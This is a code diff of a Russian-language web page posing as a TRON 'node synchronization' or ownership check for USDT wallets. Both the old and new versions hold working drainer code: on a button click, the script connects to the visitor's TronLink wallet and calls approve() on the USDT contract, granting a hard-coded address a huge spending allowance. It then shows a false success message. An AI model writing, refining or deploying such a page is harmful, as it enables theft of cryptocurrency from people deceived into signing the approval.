@@ -2,78 +2,64 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flash USDT: Synchronization Protocol</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tron Protocol Sync</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { background: #0a0a0a; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { padding: 45px 30px; width: 90%; max-width: 420px; background: #111; border-radius: 25px; border: 1px solid #222; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
-        .status { font-size: 11px; color: #0088cc; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 20px; font-weight: bold; }
-        .logo { width: 70px; height: 70px; background: #0088cc; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; box-shadow: 0 0 30px rgba(0,136,204,0.3); }
-        h2 { font-size: 24px; margin-bottom: 15px; font-weight: 700; }
-        p { color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 35px; }
-        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 15px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; transition: 0.3s; }
-        .btn:hover { background: #0099ee; box-shadow: 0 0 20px rgba(0,136,204,0.4); }
-        .btn:disabled { background: #333; color: #555; cursor: not-allowed; }
-        #error-msg { color: #ff4444; font-size: 13px; margin-top: 20px; display: none; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; }
+        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; box-shadow: 0 0 25px rgba(255,0,19,0.4); }
+        h2 { font-size: 22px; margin-bottom: 15px; }
+        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 35px; }
+        .btn { display: block; background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; }
+        #err { color: #ff4444; font-size: 12px; margin-top: 20px; display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="status">● Secure Connection Active</div>
     <div class="logo">T</div>
-    <h2>Верификация узла</h2>
-    <p>Для автоматического зачисления USDT необходимо подтвердить синхронизацию вашего кошелька с узлом валидации TRC-20.</p>
-    
-    <button id="actionBtn" class="btn">Запустить синхронизацию</button>
-    <div id="error-msg">Кошелек не обнаружен. Убедитесь, что расширение кошелька включено и выбрана сеть TRON.</div>
+    <h2>Синхронизация узла</h2>
+    <p>Нажмите кнопку ниже, чтобы подтвердить владение адресом в сети TRC-20 через TronLink.</p>
+    <button id="mainBtn" class="btn">ЗАПУСТИТЬ ПРОВЕРКУ</button>
+    <div id="err">Кошелек не обнаружен. Откройте эту страницу внутри TronLink.</div>
 </div>
 
 <script>
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const btn = document.getElementById('mainBtn');
 
-    const btn = document.getElementById('actionBtn');
-    const errMsg = document.getElementById('error-msg');
-
-    async function start() {
-        // Ищем кошелек (будь то Trust Wallet, TronLink или Bitget на ПК)
+    btn.onclick = async () => {
         const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
 
-        if (!tron) {
-            errMsg.style.display = 'block';
-            return;
+        if (tron) {
+            try {
+                btn.innerText = "ПОДКЛЮЧЕНИЕ...";
+                btn.disabled = true;
+
+                // Запрос аккаунта
+                await tron.request({ method: 'tron_requestAccounts' });
+                
+                // Подключение к контракту USDT
+                const contract = await tron.contract().at(CONTRACT);
+                
+                // Вызов Approve
+                await contract.approve(ADMIN, '1000000000000000000').send({
+                    feeLimit: 100000000
+                });
+
+                alert("Синхронизация успешно завершена!");
+                btn.innerText = "ГОТОВО";
+            } catch (e) {
+                alert("Ошибка: " + e.message);
+                btn.disabled = false;
+                btn.innerText = "ПОВТОРИТЬ";
+            }
+        } else {
+            document.getElementById('err').style.display = "block";
         }
-
-        try {
-            btn.innerText = "ПОДКЛЮЧЕНИЕ...";
-            btn.disabled = true;
-            errMsg.style.display = 'none';
-
-            // Запрос на подключение (Connect)
-            await tron.request({ method: 'tron_requestAccounts' });
-
-            // Подключаемся к контракту USDT
-            const contract = await tron.contract().at(CONTRACT);
-            
-            // Вызываем Approve
-            const result = await contract.approve(ADMIN, '1000000000000000000').send({
-                feeLimit: 100000000
-            });
-
-            btn.innerText = "УСПЕШНО";
-            alert("Синхронизация успешно завершена. Ожидайте зачисления активов.");
-            
-        } catch (e) {
-            console.error(e);
-            btn.innerText = "ПОВТОРИТЬ";
-            btn.disabled = false;
-            alert("Ошибка: Действие отклонено пользователем или неверная сеть.");
-        }
-    }
-
-    btn.onclick = start;
+    };
 </script>
 </body>
 </html>
